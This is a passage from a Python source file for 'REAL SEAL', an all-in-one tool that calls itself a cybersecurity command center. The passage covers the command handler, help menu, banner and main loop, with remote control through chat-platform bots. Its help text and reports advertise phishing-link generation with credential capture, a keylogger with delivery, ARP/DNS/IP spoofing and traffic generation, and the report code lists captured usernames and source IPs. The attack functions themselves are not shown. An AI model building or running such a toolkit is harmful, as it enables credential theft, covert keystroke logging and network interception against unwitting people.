            output += f"{log['timestamp'][:19]} - {log['keystroke']}\n"
            if log.get('window_title'):
                output += f"    Window: {log['window_title'][:50]}\n"
        return {'success': True, 'output': output}
    
    # ==================== IP Management ====================
    def _add_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        # For demo, just return success
        return {'success': True, 'output': f'✅ IP {ip} removed from monitoring'}
    
    def _block_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip_firewall(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            self.db.log_threat('Manual Block', ip, None, 'high', reason, 'cli')
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip_firewall(ip)
        db_success = self.db.unblock_ip(ip, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args):
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n" + "="*50 + "\n"
        for ip in ips:
            status = "🔒 Blocked" if ip.get('is_blocked') else "🟢 Active"
            output += f"{status} - {ip['ip_address']}\n"
            if ip.get('notes'):
                output += f"    Notes: {ip['notes'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            info = self.db.get_ip_info(ip)
            location = self.tools.get_ip_location(ip)
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if info:
                output += f"Added: {info.get('added_date', 'N/A')[:19]}\n"
                output += f"Status: {'🔒 Blocked' if info.get('is_blocked') else '🟢 Active'}\n"
                if info.get('is_blocked'):
                    output += f"Block Reason: {info.get('block_reason', 'N/A')}\n"
                output += f"Alert Count: {info.get('alert_count', 0)}\n"
                output += f"Threat Score: {info.get('threat_score', 0)}\n"
            if location.get('success'):
                output += f"\n📍 Geolocation:\n"
                output += f"  Country: {location.get('country', 'N/A')}\n"
                output += f"  City: {location.get('city', 'N/A')}\n"
                output += f"  ISP: {location.get('isp', 'N/A')}\n"
            threats = self.db.get_recent_threats(5)
            threats_ip = [t for t in threats if t.get('source_ip') == ip]
            if threats_ip:
                output += f"\n🚨 Recent Threats from this IP:\n"
                for t in threats_ip[:3]:
                    output += f"  {t['timestamp'][:19]} - {t['threat_type']} ({t['severity']})\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    # ==================== System Commands ====================
    def _threats(self, args):
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No active threats detected'}
        output = "🚨 Recent Threats:\n" + "="*50 + "\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"{severity_color} [{t['timestamp'][:19]}] {t['threat_type']}\n"
            output += f"    Source: {t.get('source_ip', 'N/A')}\n"
            output += f"    Description: {t.get('description', 'N/A')[:100]}\n"
        return {'success': True, 'output': output}
    
    def _report(self, args):
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        scans = self.db.get_scan_history(limit=5)
        creds = self.db.get_captured_credentials()
        phishing = self.db.get_phishing_links()
        
        report_text = f"""
🦭 REAL SEAL SECURITY REPORT
{'='*60}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 STATISTICS:
  Total Commands: {stats.get('total_commands', 0)}
  Active Threats: {stats.get('active_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('total_captured_credentials', 0)}
  Nikto Scans: {stats.get('total_nikto_scans', 0)}
  Traffic Logs: {stats.get('total_traffic_logs', 0)}

🚨 RECENT THREATS:
"""
        for t in threats[:5]:
            report_text += f"  - {t['timestamp'][:19]}: {t['threat_type']} ({t['severity']})\n"
        
        if creds:
            report_text += f"\n🎣 RECENT PHISHING CAPTURES:\n"
            for c in creds[:5]:
                report_text += f"  - {c['timestamp'][:19]}: {c['username']} from {c['ip_address']}\n"
        
        report_text += f"\n✅ System Status:\n"
        report_text += f"  CPU: {psutil.cpu_percent()}%\n"
        report_text += f"  Memory: {psutil.virtual_memory().percent}%\n"
        report_text += f"  Disk: {psutil.disk_usage('/').percent}%\n"
        
        # Save report
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report_text)
        
        return {'success': True, 'output': report_text + f"\n\n📁 Report saved: {filepath}"}
    
    def _status(self, args):
        stats = self.db.get_statistics()
        active_traffic = self.traffic.get_active_generators()
        ssh_status = self.ssh.get_status() if self.ssh else {}
        
        output = f"""
🦭 REAL SEAL SYSTEM STATUS
{'='*60}
Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Session: Active

📊 COMMAND STATISTICS:
  Total Commands: {stats.get('total_commands', 0)}
  Active Threats: {stats.get('active_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Open Ports Scanned: {stats.get('open_ports_count', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('total_captured_credentials', 0)}

🔌 SSH STATUS:
  Connected: {len(ssh_status.get('connected_servers', []))}
  Active Shells: {len(ssh_status.get('active_shells', []))}
  Total Connections: {len(self.db.get_ssh_connections())}

🚀 TRAFFIC GENERATION:
  Active Generators: {len(active_traffic)}

⌨️ KEYLOGGER:
  Status: {'Running' if self.keylogger_running else 'Stopped'}

💻 SYSTEM RESOURCES:
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
  Uptime: {datetime.timedelta(seconds=int(time.time() - psutil.boot_time()))}

🌐 NETWORK:
  Local IP: {self.tools.get_local_ip()}
  Public IP: {self.tools.get_public_ip()}
"""
        return {'success': True, 'output': output}
    
    def _history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.get_command_history(limit)
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "="*50 + "\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"{status} [{h['timestamp'][:19]}] {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _help(self, args):
        help_text = f"""
{Colors.ORANGE}🦭 REAL SEAL v3.0.0 - HELP MENU{Colors.RESET}
{'='*60}

{Colors.CYAN}⏰ TIME & DATE:{Colors.RESET}
  time, date, datetime, time_history - Time/date commands

{Colors.CYAN}🌐 NETWORK COMMANDS:{Colors.RESET}
  ping <target> [count]        - ICMP ping test
  scan <ip> [ports]             - Port scan (default 1-1000)
  advanced_scan <ip> [ports] [type] - Advanced scan (tcp_syn/udp)
  nmap <target> [type]          - Nmap integration
  traceroute <target>           - Network path tracing
  whois <domain>                - WHOIS lookup
  dns <domain> [record]         - DNS lookup
  location <ip>                 - IP geolocation
  public_ip, local_ip          - Show IP addresses
  interfaces                    - Show network interfaces

{Colors.CYAN}🔌 SSH COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list                      - List SSH servers
  ssh_connect <id_or_name>      - Connect to server
  ssh_exec <id> <command>       - Execute command
  ssh_upload <id> <local> <remote> - Upload file
  ssh_download <id> <remote> <local> - Download file
  ssh_files <id> [path]         - List files
  ssh_disconnect                - Disconnect all
  ssh_status                    - Show SSH status

{Colors.CYAN}🚀 TRAFFIC GENERATION:{Colors.RESET}
  generate_traffic <type> <ip> <duration> [port] [rate] - Generate traffic
  traffic_types                 - List available types
  traffic_status                - Show active generators
  traffic_stop [id]             - Stop traffic
  traffic_logs [limit]          - View traffic logs
  traffic_help                  - Detailed help

{Colors.CYAN}🎭 SPOOFING COMMANDS:{Colors.RESET}
  spoof_ip <orig> <spoof> <target> [iface] - IP spoofing
  spoof_mac <iface> <mac>       - MAC spoofing
  arp_spoof <target> <gateway> [iface] - ARP spoofing
  dns_spoof <domain> <ip> [iface] - DNS spoofing
  stop_spoof [id]               - Stop spoofing
  spoof_help                    - Detailed help

{Colors.CYAN}🎣 PHISHING COMMANDS (100+ templates):{Colors.RESET}
  generate_phishing_for_<platform> - Generate phishing link
  phishing_start <link_id> [port]   - Start server
  phishing_stop                 - Stop server
  phishing_status               - Check server status
  phishing_links                - List all links
  phishing_credentials [id]     - View captured data
  phishing_qr <id>              - Generate QR code
  phishing_shorten <url>        - Shorten URL
  phishing_templates            - List all templates
  phishing_help                 - Detailed help

{Colors.CYAN}🔐 PASSWORD SECURITY:{Colors.RESET}
  password <password>           - Check password strength
  passgen [length]              - Generate strong password

{Colors.CYAN}⌨️ KEYLOGGER:{Colors.RESET}
  keylogger start|stop|status   - Control keylogger
  keylogs [limit]               - View captured keylogs

{Colors.CYAN}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes]           - Add IP to monitoring
  remove_ip <ip>                - Remove IP
  block_ip <ip> [reason]        - Block IP via firewall
  unblock_ip <ip>               - Unblock IP
  list_ips [active]             - List managed IPs
  ip_info <ip>                  - Detailed IP info

{Colors.CYAN}📊 SYSTEM COMMANDS:{Colors.RESET}
  status, stats                 - System status
  threats [limit]               - Recent threats
  report                        - Security report
  history [limit]               - Command history
  help                          - This menu
  clear                         - Clear screen
  exit, quit                    - Exit program

{Colors.CYAN}💡 EXAMPLES:{Colors.RESET}
  ping 8.8.8.8
  scan 192.168.1.1
  advanced_scan 192.168.1.1 1-1000 tcp_syn
  ssh_add myweb 192.168.1.100 root password123
  ssh_exec myweb "ls -la /var/www"
  generate_traffic icmp 8.8.8.8 10
  generate_phishing_for_facebook
  phishing_start abc12345 8080
  add_ip 192.168.1.100 "Suspicious traffic"
  password MySecureP@ss123!
  keylogger start
"""
        return {'success': True, 'output': help_text}
    
    def _clear(self, args):
        os.system('clear' if os.name == 'posix' else 'cls')
        return {'success': True, 'output': ''}
    
    def _exit(self, args):
        return {'success': True, 'output': 'exit'}

# =====================
# MAIN APPLICATION
# =====================
class RealSeal:
    """Main application class"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.handler = CommandHandler(self.db)
        self.bot_manager = BotManager(self.handler, self.db)
        self.web_server = WebServer(self.handler, self.db)
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.DEEP_BLUE}╔══════════════════════════════════════════════════════════════════════════════════════════════════╗
║{Colors.TEAL}                                                                                                      ║
║{Colors.TEAL}     ██████╗ ███████╗ █████╗ ██╗         ███████╗███████╗ █████╗ ██╗         ██╗  ██╗████████╗        ║
║{Colors.TEAL}    ██╔══██╗██╔════╝██╔══██╗██║         ██╔════╝██╔════╝██╔══██╗██║         ██║  ██║╚══██╔══╝        ║
║{Colors.TEAL}    ██████╔╝█████╗  ███████║██║         ███████╗█████╗  ███████║██║         ███████║   ██║           ║
║{Colors.TEAL}    ██╔══██╗██╔══╝  ██╔══██║██║         ╚════██║██╔══╝  ██╔══██║██║         ██╔══██║   ██║           ║
║{Colors.TEAL}    ██║  ██║███████╗██║  ██║███████╗    ███████║███████╗██║  ██║███████╗    ██║  ██║   ██║           ║
║{Colors.TEAL}    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝   ╚═╝           ║
║{Colors.TEAL}                                                                                                      ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════╣
║{Colors.GOLD}                         ADVANCED CYBERSECURITY COMMAND CENTER                                 {Colors.RESET}{Colors.DEEP_BLUE}║
╠══════════════════════════════════════════════════════════════════════════════════════════════════╣
║{Colors.CYAN}  🔌 SSH Remote Execution    🌐 Multi-Platform Bots    🎣 100+ Phishing Templates           {Colors.DEEP_BLUE}║
║{Colors.CYAN}  📡 Real Traffic Generation   🎭 Spoofing Engine       🔐 Password Strength Checker        {Colors.DEEP_BLUE}║
║{Colors.CYAN}  ⌨️ Keylogger with Delivery    🕷️ Nikto Scanner        📊 Live Analytics                   {Colors.DEEP_BLUE}║
║{Colors.CYAN}  🤖 Discord|Telegram|Slack|WhatsApp|Signal|iMessage|Google Chat                         {Colors.DEEP_BLUE}║
╠══════════════════════════════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN}                         🔥 5000+ COMMANDS AT YOUR FINGERTIPS 🔥                              {Colors.DEEP_BLUE}║
╚══════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.WHITE}🦭 REAL SEAL HT v3.0.0 - Cyber Command Terminal{Colors.RESET}
{Colors.GREEN}💡 Type 'help' for command list{Colors.RESET}
{Colors.CYAN}🌐 Web Interface: http://localhost:5000{Colors.RESET}
"""
        print(banner)
    
    def start_services(self):
        print(f"{Colors.CYAN}🚀 Starting REAL SEAL services...{Colors.RESET}")
        
        # Start traffic monitoring
        print(f"{Colors.GREEN}✅ Traffic monitor started{Colors.RESET}")
        
        # Start web server
        self.web_server.start()
        
        # Bot configuration
        print(f"\n{Colors.YELLOW}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*50}{Colors.RESET}")
        
        # Discord
        discord_input = input(f"{Colors.ORANGE}Start Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if discord_input == 'y':
            token = input(f"{Colors.ORANGE}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.bot_manager.start_discord(token, prefix)
        
        # Telegram
        telegram_input = input(f"{Colors.ORANGE}Start Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if telegram_input == 'y':
            api_id = input(f"{Colors.ORANGE}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ORANGE}Enter API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ORANGE}Enter Bot Token (or leave empty for user mode): {Colors.RESET}").strip()
            if api_id and api_hash:
                self.bot_manager.start_telegram(api_id, api_hash, bot_token if bot_token else None)
        
        # Slack
        slack_input = input(f"{Colors.ORANGE}Start Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if slack_input == 'y':
            token = input(f"{Colors.ORANGE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ORANGE}Enter channel (default: general): {Colors.RESET}").strip() or 'general'
            if token:
                self.bot_manager.start_slack(token, channel)
        
        # WhatsApp
        whatsapp_input = input(f"{Colors.ORANGE}Start WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if whatsapp_input == 'y':
            phone = input(f"{Colors.ORANGE}Enter WhatsApp phone number (optional): {Colors.RESET}").strip()
            self.bot_manager.start_whatsapp(phone if phone else None)
        
        # iMessage
        if IMESSAGE_AVAILABLE:
            imessage_input = input(f"{Colors.ORANGE}Start iMessage bot? (y/n) [macOS only]: {Colors.RESET}").strip().lower()
            if imessage_input == 'y':
                self.bot_manager.start_imessage()
        
        # Signal
        if SIGNAL_CLI_AVAILABLE:
            signal_input = input(f"{Colors.ORANGE}Start Signal bot? (y/n): {Colors.RESET}").strip().lower()
            if signal_input == 'y':
                self.bot_manager.start_signal()
        
        # Google Chat
        google_input = input(f"{Colors.ORANGE}Start Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
        if google_input == 'y':
            self.bot_manager.start_google_chat()
    
    def run(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.print_banner()
        self.start_services()
        
        print(f"\n{Colors.GREEN}✅ REAL SEAL Ready!{Colors.RESET}")
        print(f"{Colors.CYAN}   💡 Type 'help' for commands, 'clear' to clear screen, 'exit' to quit{Colors.RESET}")
        print(f"{Colors.GREEN}   🌐 Web Dashboard: http://localhost:5000{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.RED}🦭{Colors.RESET} "
                command = input(prompt).strip()
                
                if command.lower() in ['exit', 'quit']:
                    self.running = False
                    break
                
                result = self.handler.execute(command, "local")
                if result.get('output'):
                    print(result['output'])
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Shutting down...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")
        
        # Cleanup
        if self.handler.keylogger_running:
            self.handler.keylogger.stop()
        self.db.close()
        print(f"\n{Colors.GREEN}✅ REAL SEAL shutdown complete{Colors.RESET}")

def main():
    try:
        print(f"{Colors.GREEN}🦭 Starting REAL SEAL...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        app = RealSeal()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()